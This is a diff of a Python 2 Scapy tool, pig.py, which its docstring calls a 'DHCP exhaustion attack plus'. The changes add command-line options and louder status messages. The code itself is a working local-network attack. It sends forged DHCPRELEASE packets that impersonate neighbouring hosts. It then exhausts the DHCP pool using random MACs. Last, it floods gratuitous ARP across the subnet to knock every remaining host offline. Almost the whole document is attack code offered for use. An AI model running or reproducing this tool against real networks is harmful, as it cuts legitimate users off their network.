@@ -1,10 +1,44 @@
 #! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+DHCP exhaustion attack plus.
+
+Usage:
+  pig.py [-d -h] <interface>
+"""
 from scapy.all import *
-import string,binascii,signal,sys,threading,socket,struct
+import string,binascii,signal,sys,threading,socket,struct,getopt
 
 conf.checkIPaddr = False
 interface = "lo"
-verbose = True
+verbose = False
+Debug=False
+
+def checkArgs():
+    global Field,Value
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], "hd")
+    except getopt.GetoptError, err:
+        # print help information and exit:
+        print str(err) # will print something like "option -a not recognized"
+        usage()
+        sys.exit(2)
+    for o,a in opts:
+        if o in ("-d,--debug"):
+            global verbose
+            verbose = True
+        elif o in ("-h", "--help"):
+            usage()
+            sys.exit()
+        else:
+            assert False, "unhandled option"
+    if len(args)==1:
+        global interface
+        interface=args[0]
+    else:
+        usage()
+        sys.exit(2)
 
 
 def signal_handler(signal, frame):
@@ -16,6 +50,8 @@ def signal_handler(signal, frame):
 
 
 ######################################
+# Necessary Network functions not included in scapy
+#
 def randomMAC():
 	mac = [ 0x00, 0x0c, 0x29,
 		random.randint(0x00, 0x7f),
@@ -68,7 +104,7 @@ def unpackMAC(binmac):
 
 ##########################################################
 #
-#
+#  ARP and create map of LAN neighbors
 #
 def neighbors():
      global dhcpsip,subnet,nodes
@@ -82,22 +118,23 @@ def neighbors():
        print "%15s - %s " % (reply.psrc, reply.hwsrc)
 
 #
-#
+# send release for our neighbors
 #
 def release():
    global dhcpsmac,dhcpsip,nodes
-   print "Sending DHCPRELEASE on " + interface
+   print "***  Sending DHCPRELEASE for neighbors "
    myxid=random.randint(1, 900000000)
    #
    #iterate over all ndoes and release their IP from DHCP server
    for cmac,cip in nodes.iteritems():
      dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
      sendp(dhcp_release,verbose=0,iface=interface)
+     print "Releasing %s - %s"%(cmac,cip)
      if verbose: print "%r"%dhcp_release
 
 #
-#
 #now knock everyone offline
+#
 def garp():
   global dhcpsip,subnet
   pool=Net(dhcpsip+"/"+calcCIDR(subnet))
@@ -105,6 +142,7 @@ def garp():
     m=randomMAC()
     arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
     sendp(arpp,verbose=0,iface=interface)
+    print "Knocking %s offline, goodbye"%ip
     if verbose: print "%r"%arpp
 
 #
@@ -143,7 +181,7 @@ class sniff_dhcp(threading.Thread):
        sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3,iface=interface)
        print "timeout waiting on dhcp packet count %d"%self.dhcpcount
        self.dhcpcount+=1
-       if self.dhcpcount==2: dhcpdos=True
+       if self.dhcpcount==5: dhcpdos=True
           
    def detect_dhcp(self,pkt):
       global dhcpsmac,dhcpsip,subnet
@@ -163,7 +201,9 @@ class sniff_dhcp(threading.Thread):
           localm=unpackMAC(pkt[BOOTP].chaddr)
           myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
         
-          print("DHCPOFFER detected from " + pkt[Ether].src,sip + " on " + interface + ", handing out IP: "+myip)
+          print("DHCPOFFER handing out IP: "+myip)
+          if verbose: print("DHCPOFFER detected from " + pkt[Ether].src,sip + " on " + interface + ", handing out IP: "+myip)
+
           dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
           sendp(dhcp_req,verbose=0,iface=interface)
           print "sent DHCP Request for "+myip
@@ -183,6 +223,7 @@ class sniff_dhcp(threading.Thread):
 # MAIN()
 #
 def main(args):
+  checkArgs()
   signal.signal(signal.SIGINT, signal_handler)
   global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
   dhcpsip=None
@@ -209,11 +250,17 @@ def main(args):
    time.sleep(5)
    print "waiting for DOS"
     
+  print "DHCP Exhausted, knock all remaining hosts offline"
+  time.sleep(10)
   garp()
-
-
+  print "All done"
+  
+def usage():
+    print __doc__
+    
 if __name__ == '__main__':
-  main(sys.argv)
+  sys.exit(not main(sys.argv))
+  #main(sys.argv)
 
 
 
